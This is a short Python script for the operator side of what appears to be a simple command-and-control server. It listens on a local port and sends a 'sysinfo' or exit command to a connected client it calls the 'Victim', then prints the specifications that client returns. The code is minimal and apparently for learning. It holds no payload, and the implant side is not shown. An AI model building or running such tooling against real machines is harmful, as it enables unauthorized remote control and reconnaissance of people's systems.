import socket


HOST = "127.0.0.1"
PORT = 10000

SYSINFO_COMMAND = 1235
EXIT_COMMAND = 2304

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"New connection made from {addr}\n")
            while True:
                order = input("Order: ")
                if order == "sysinfo":
                    conn.sendall(SYSINFO_COMMAND.to_bytes(8, "little", signed=False))
                    message_length_bytes = conn.recv(8)
                    message_length = int.from_bytes(message_length_bytes, "little", signed=False)
                    system_info = conn.recv(message_length)
                    print("Victim's specifications:\n")
                    print(system_info.decode())
                    print()
                elif order == "goodbye":
                    print("Closing the connection...")
                    conn.sendall(EXIT_COMMAND.to_bytes(8, "little", signed=False))
                    break
                else:
                    print("Invalid command")
    print("Connection closed")

if __name__ == "__main__":
    main()